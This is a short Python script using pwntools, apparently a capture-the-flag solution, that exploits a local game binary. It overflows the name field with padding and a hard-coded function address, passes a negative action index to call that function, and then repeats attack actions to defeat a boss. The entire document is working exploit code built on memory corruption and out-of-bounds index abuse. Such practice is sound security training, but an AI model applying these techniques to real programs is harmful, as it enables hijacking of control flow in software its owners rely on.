#!/usr/bin/env python3

from pwn import *


# Constants
WARRIOR_CLASS = b'1'
HP_POINTS = b'1'
STR_POINTS = b'29'
MALICIOUS_ACTION_INDEX = b'-1'
ATTACK_ACTION = b'1'


# Constants found by manual enumeration
HIT_FUNCTION_ADDR = 0x804864b


p = process('./files/game')

# set the name with hit function address, which we will invoke
payload = b'A' * 12 + p32(HIT_FUNCTION_ADDR) + b'A' * 4

# set attributes
payload += WARRIOR_CLASS + b' ' + HP_POINTS + b' ' + STR_POINTS

# call hit function which will boost our health
payload += MALICIOUS_ACTION_INDEX

# spam attack action to finish the boss
payload += 100 * (b' ' + ATTACK_ACTION)


p.sendline(payload)

p.interactive()